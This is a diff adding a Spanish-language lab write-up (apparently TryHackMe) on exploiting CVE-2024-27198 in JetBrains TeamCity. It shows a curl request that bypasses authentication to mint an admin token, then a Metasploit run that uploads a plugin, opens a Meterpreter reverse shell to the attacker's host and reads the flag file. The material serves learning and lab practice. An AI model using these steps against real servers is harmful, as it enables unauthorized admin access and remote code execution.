@@ -54,3 +54,108 @@ Una vez ejecutado el comando `python CVE-2024-27198.py -t http://10.128.148.36:5
 ![](Evidencias_Visuales/newcredentials)
 
 ![](Evidencias_Visuales/newlogin)
+
+Otra forma de lograr acceso es mediante la inyección de un toquen de acceso al usuario admin mediante el comando: 
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -ik 'http://10.128.148.36:50000/hax?jsp=/app/rest/users/id:1/tokens/AgartiToken;.jsp' -X POST
+HTTP/1.1 200 
+TeamCity-Node-Id: MAIN_SERVER
+Cache-Control: no-store
+Content-Type: application/xml;charset=ISO-8859-1
+Content-Language: en
+Content-Length: 237
+Date: Mon, 22 Jun 2026 11:11:28 GMT
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="AgartiToken" creationTime="2026-06-22T11:11:27.989Z" value="eyJ0eXAiOiAiVENWMiJ9.Uy1sYXM0U0J5T3REb2FNWFlmODJ4WTBJaW53.NjlkZTZiYzUtNmM3Ni00NzM2LTg4ODQtYTg2NmFhODZkNjIx"/> 
+```
+![](Evidencias_Visuales/accesstoken)
+
+Token: eyJ0eXAiOiAiVENWMiJ9.a1JOTGtNSThuSC1uUjVBMS16bE8yVTBfb2lz.NTNiMmRmNGEtYzFlZC00MjVhLTk5YzktOGVjZWRkNWRiOWYz
+
+#Opción 2: Metasploit 
+
+```bash
+search cve:2024-27198
+exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options
+
+msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set rhost 10.128.148.36
+rhost => 10.128.148.36
+msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set lhost 192.168.128.160
+lhost => 192.168.128.160
+msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options
+
+Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   Proxies                             no        A proxy chain of format type:host:port[,type:host:po
+                                                 rt][...]. Supported proxies: socks5, socks5h, sapni,
+                                                  http, socks4
+   RHOSTS             10.128.148.36    yes       The target host(s), see https://docs.metasploit.com/
+                                                 docs/using-metasploit/basics/using-metasploit.html
+   RPORT              50000            yes       The target port (TCP)
+   SSL                false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI          /                yes       The base path to TeamCity
+   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate a
+                                                 s
+   VHOST                               no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.128.160  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java
+
+msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit
+[*] Started reverse TCP handler on 192.168.128.160:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
+[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.RTJEcmlaRHpwOGJPSW5wVXpzRjB1RWVaQjVV.MmM5NmUyOTAtMzY0OS00MTNmLWE2NGEtNzdiNjU4NzZhOGI0
+[*] Uploading plugin: nFkmodSC
+[*] Sending stage (58073 bytes) to 10.128.148.36
+[*] Deleting the plugin...
+[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_nFkmodSC
+[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/nFkmodSC
+[*] Meterpreter session 1 opened (192.168.128.160:4444 -> 10.128.148.36:53446) at 2026-06-22 12:21:19 +0200
+[*] Deleting the authentication token...
+[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/nFkmodSC' on the target
+
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+```
+
+```bash
+cd /home/ubuntu
+ls -la
+total 60
+drwxr-xr-x 7 ubuntu ubuntu 4096 Aug  2  2024 .
+drwxr-xr-x 3 root   root   4096 Jul  2  2024 ..
+drwxr-x--- 6 ubuntu ubuntu 4096 Jun 22 07:25 .BuildServer
+lrwxrwxrwx 1 root   root      9 Jul  2  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
+drwx------ 2 ubuntu ubuntu 4096 Jul  2  2024 .cache
+drwx------ 3 ubuntu ubuntu 4096 Aug  2  2024 .config
+drwxrwxr-x 3 ubuntu ubuntu 4096 Jul  2  2024 .local
+-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
+-rw-rw-r-- 1 ubuntu ubuntu   66 Jul  2  2024 .selected_editor
+drwx------ 2 ubuntu ubuntu 4096 Jul  2  2024 .ssh
+-rw-r--r-- 1 ubuntu ubuntu    0 Jul  2  2024 .sudo_as_admin_successful
+-rw-rw-r-- 1 ubuntu ubuntu  214 Jul  2  2024 .wget-hsts
+-rw-rw-r-- 1 ubuntu ubuntu 4829 Jul  2  2024 config.log
+-rw-rw-r-- 1 ubuntu ubuntu   38 Jul  2  2024 flag.txt
+cat flag.txt
+THM{faa9bac345709b6620a6200b484c7594}
+```
